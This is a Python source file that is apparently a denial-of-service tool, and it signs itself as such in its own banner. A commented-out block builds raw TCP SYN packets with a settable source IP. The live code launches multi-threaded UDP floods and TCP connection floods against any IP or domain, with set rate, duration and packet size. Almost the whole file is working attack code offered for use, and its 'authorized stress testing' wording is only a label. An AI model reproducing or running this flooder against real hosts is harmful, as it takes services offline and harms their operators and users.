# import socket
# import threading
# import random
# import time
# import logging
# import argparse
# import struct
# import dns.resolver
# from datetime import datetime

# # Configure logging with more detailed format
# logging.basicConfig(
#     filename=f'stress_test_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log',
#     level=logging.INFO,
#     format='%(asctime)s - %(levelname)s - Thread-%(thread)d - %(message)s'
# )

# def resolve_domain(domain):
#     """Resolve domain name to IP address."""
#     try:
#         answers = dns.resolver.resolve(domain, 'A')
#         ip = answers[0].address
#         logging.info(f"Resolved {domain} to {ip}")
#         return ip
#     except Exception as e:
#         logging.error(f"Failed to resolve domain {domain}: {e}")
#         return None

# def create_ip_header(src_ip, dst_ip):
#     """Create IP header for the packet."""
#     ip_ihl = 5  # Internet Header Length
#     ip_ver = 4  # IPv4
#     ip_tos = 0  # Type of Service
#     ip_tot_len = 0  # Kernel will fill
#     ip_id = random.randint(0, 65535)  # Random ID
#     ip_frag_off = 0
#     ip_ttl = 255
#     ip_proto = socket.IPPROTO_TCP
#     ip_check = 0  # Kernel will fill
#     ip_saddr = socket.inet_aton(src_ip)
#     ip_daddr = socket.inet_aton(dst_ip)

#     ip_ihl_ver = (ip_ver << 4) + ip_ihl
#     ip_header = struct.pack('!BBHHHBBH4s4s',
#                            ip_ihl_ver, ip_tos, ip_tot_len,
#                            ip_id, ip_frag_off, ip_ttl,
#                            ip_proto, ip_check, ip_saddr, ip_daddr)
#     return ip_header

# def create_tcp_packet(src_ip, dst_ip, src_port, dest_port=80):
#     """Create a complete TCP SYN packet with IP header."""
#     try:
#         # TCP Header
#         tcp_seq = random.randint(0, 4294967295)
#         tcp_ack_seq = 0
#         tcp_doff = 5  # Data offset (5 words = 20 bytes)
#         tcp_flags = 0x02  # SYN flag
#         tcp_window = socket.htons(5840)
#         tcp_check = 0
#         tcp_urg_ptr = 0

#         tcp_header = struct.pack('!HHLLBBHHH',
#                                 src_port, dest_port, tcp_seq,
#                                 tcp_ack_seq, (tcp_doff << 4), tcp_flags,
#                                 tcp_window, tcp_check, tcp_urg_ptr)

#         # Pseudo header for TCP checksum
#         src_addr = socket.inet_aton(src_ip)
#         dst_addr = socket.inet_aton(dst_ip)
#         placeholder = 0
#         protocol = socket.IPPROTO_TCP
#         tcp_length = len(tcp_header)

#         psh = struct.pack('!4s4sBBH',
#                          src_addr, dst_addr, placeholder,
#                          protocol, tcp_length)
#         psh = psh + tcp_header

#         # Calculate TCP checksum
#         tcp_check = checksum(psh)
#         tcp_header = struct.pack('!HHLLBBHHH',
#                                 src_port, dest_port, tcp_seq,
#                                 tcp_ack_seq, (tcp_doff << 4), tcp_flags,
#                                 tcp_window, tcp_check, tcp_urg_ptr)

#         ip_header = create_ip_header(src_ip, dst_ip)
#         return ip_header + tcp_header
#     except Exception as e:
#         logging.error(f"Error creating packet: {e}")
#         return None

# def checksum(msg):
#     """Calculate checksum for TCP header."""
#     s = 0
#     for i in range(0, len(msg), 2):
#         w = (msg[i] << 8) + (msg[i + 1] if i + 1 < len(msg) else 0)
#         s = s + w
#     s = (s >> 16) + (s & 0xffff)
#     s = s + (s >> 16)
#     return ~s & 0xffff

# def send_packets(target, port, packet_rate, duration, thread_id, src_ip="0.0.0.0"):
#     """Send TCP packets at specified rate for given duration."""
#     try:
#         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
#     except socket.error as e:
#         logging.error(f"Thread {thread_id}: Socket creation failed: {e}")
#         return

#     start_time = time.time()
#     packets_sent = 0

#     while time.time() - start_time < duration:
#         try:
#             src_port = random.randint(1024, 65535)
#             packet = create_tcp_packet(src_ip, target, src_port, port)
#             if packet:
#                 sock.sendto(packet, (target, 0))  # Port 0 as we're using raw socket
#                 packets_sent += 1
#                 logging.info(f"Thread {thread_id}: Sent packet {packets_sent} to {target}:{port}")
#                 time.sleep(1.0 / packet_rate)
#         except socket.error as e:
#             logging.error(f"Thread {thread_id}: Send failed: {e}")
#             break
#         except KeyboardInterrupt:
#             logging.info(f"Thread {thread_id}: Stopped by user")
#             break

#     sock.close()
#     logging.info(f"Thread {thread_id}: Completed. Sent {packets_sent} packets")

# def stress_test(target, port=80, threads=5, packet_rate=100, duration=60, src_ip="0.0.0.0"):
#     """Run multi-threaded stress test with domain support."""
#     # Resolve domain if provided
#     try:
#         socket.inet_aton(target)  # Check if target is already an IP
#         ip = target
#     except socket.error:
#         ip = resolve_domain(target)
#         if not ip:
#             logging.error("Could not resolve domain or invalid IP")
#             return

#     logging.info(f"Starting stress test on {target} ({ip}):{port} with {threads} threads, "
#                  f"{packet_rate} packets/sec/thread, for {duration} seconds")

#     thread_list = []
#     for i in range(threads):
#         thread = threading.Thread(
#             target=send_packets,
#             args=(ip, port, packet_rate, duration, i, src_ip)
#         )
#         thread_list.append(thread)
#         thread.start()

#     for thread in thread_list:
#         thread.join()

#     logging.info("Stress test completed")

# def main():
#     parser = argparse.ArgumentParser(description="Enhanced network stress testing tool")
#     parser.add_argument("target", help="Target IP address or domain name")
#     parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
#     parser.add_argument("--threads", type=int, default=5, help="Number of threads (default: 5)")
#     parser.add_argument("--rate", type=int, default=100, help="Packets per second per thread (default: 100)")
#     parser.add_argument("--duration", type=int, default=60, help="Test duration in seconds (default: 60)")
#     parser.add_argument("--source-ip", default="0.0.0.0", help="Source IP address (default: 0.0.0.0)")
    
#     args = parser.parse_args()

#     try:
#         stress_test(args.target, args.port, args.threads, args.rate, args.duration, args.source_ip)
#     except Exception as e:
#         logging.error(f"Stress test failed: {e}")
#         print(f"Error: {e}")

# if __name__ == "__main__":
#     print("WARNING: This tool is for authorized network stress testing only.")
#     print("Ensure you have explicit permission from the network owner.")
#     print("Use of this tool may require root/admin privileges for raw sockets.")
#     main()

import socket
import threading
import random
import time
import logging
import argparse
import dns.resolver
from datetime import datetime

logging.basicConfig(
    filename=f'stress_log_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - Thread-%(thread)d - %(message)s'
)

def resolve_target(target):
    try:
        socket.inet_aton(target)
        return target
    except socket.error:
        try:
            return dns.resolver.resolve(target, 'A')[0].to_text()
        except Exception as e:
            logging.error(f"DNS resolution failed for {target}: {e}")
            return None

def udp_flood(ip, port, packet_size, rate, duration, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(packet_size)
    end_time = time.time() + duration
    sent = 0
    while time.time() < end_time:
        try:
            sock.sendto(data, (ip, port))
            sent += 1
            logging.info(f"[UDP] Thread {thread_id} sent packet {sent}")
            time.sleep(1 / rate)
        except Exception as e:
            logging.error(f"[UDP] Thread {thread_id} error: {e}")
            break

def tcp_syn_flood(ip, port, rate, duration, thread_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        logging.error(f"[TCP] Thread {thread_id} failed to create socket: {e}")
        return

    end_time = time.time() + duration
    sent = 0
    while time.time() < end_time:
        try:
            src_port = random.randint(1024, 65535)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sent += 1
            logging.info(f"[TCP] Thread {thread_id} sent SYN {sent}")
            time.sleep(1 / rate)
            sock.close()
        except:
            pass  

def launch_attack(mode, ip, port, threads, rate, duration, packet_size):
    logging.info(f"Starting {mode.upper()} flood on {ip}:{port} with {threads} threads")
    thread_list = []
    for i in range(threads):
        if mode == "udp":
            t = threading.Thread(target=udp_flood, args=(ip, port, packet_size, rate, duration, i))
        elif mode == "tcp":
            t = threading.Thread(target=tcp_syn_flood, args=(ip, port, rate, duration, i))
        else:
            logging.error("Invalid attack mode.")
            return
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    logging.info(f"{mode.upper()} flood completed on {ip}:{port}")

def main():
    parser = argparse.ArgumentParser(description="Advanced Local Network Stress Tool (Safe Use Only)")
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--mode", choices=["udp", "tcp"], default="udp", help="Attack mode: udp or tcp")
    parser.add_argument("--rate", type=int, default=100, help="Packets per second per thread")
    parser.add_argument("--duration", type=int, default=10, help="Attack duration in seconds")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("--packet-size", type=int, default=1024, help="Size of UDP packets in bytes")

    args = parser.parse_args()
    ip = resolve_target(args.target)
    if ip:
        launch_attack(args.mode, ip, args.port, args.threads, args.rate, args.duration, args.packet_size)
    else:
        print("Invalid target")

if __name__ == "__main__":
    print("denial of service attack by e404 -Sagar Ghimire ")
    main()
